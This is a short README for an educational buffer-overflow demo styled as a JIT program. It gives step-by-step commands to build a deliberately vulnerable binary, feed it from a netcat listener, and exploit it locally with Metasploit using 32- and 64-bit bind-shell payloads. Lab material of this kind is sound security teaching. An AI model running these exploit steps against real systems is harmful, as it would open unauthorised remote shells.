# ijit
Simple buffer overflow demo, in the style of a Just-In-Time compiled (JIT) program.

Install metasploit and then check out this code.  
Softlink ijit.rb into metasploit's modules.
(Don't check out directly into modules/exploits, that will make 
msfconsole hang at startup when it sees the executable git hooks!)

```
cd
git clone https://github.com/olawlor/security
mkdir -p ~/.msf4/modules/exploits/linux
cd ~/.msf4/modules/exploits/linux
ln -s ~/security/ijit/ijit.rb .
```

Now compile and run the vulnerable program (compiled here as a 32-bit x86 program):

```
sudo apt-get install build-essential gcc gcc-multilib
cd ~/security/ijit
gcc -m32 ijit.c -g -o ./ijit32 
nc -l -p 8888 | ./ijit32
```

Leave the vulnerable program running.

In another terminal, exploit it with msfconsole:

```
msfconsole
use exploit/linux/ijit
reload
set RHOST 127.0.0.1
set nop x86/single_byte
set payload linux/x86/shell/bind_tcp
exploit
```

If you compile a 64-bit version of that executable, the same exploit
will work with 
```
set nop x64/simple
set payload linux/x64/shell/bind_tcp
```


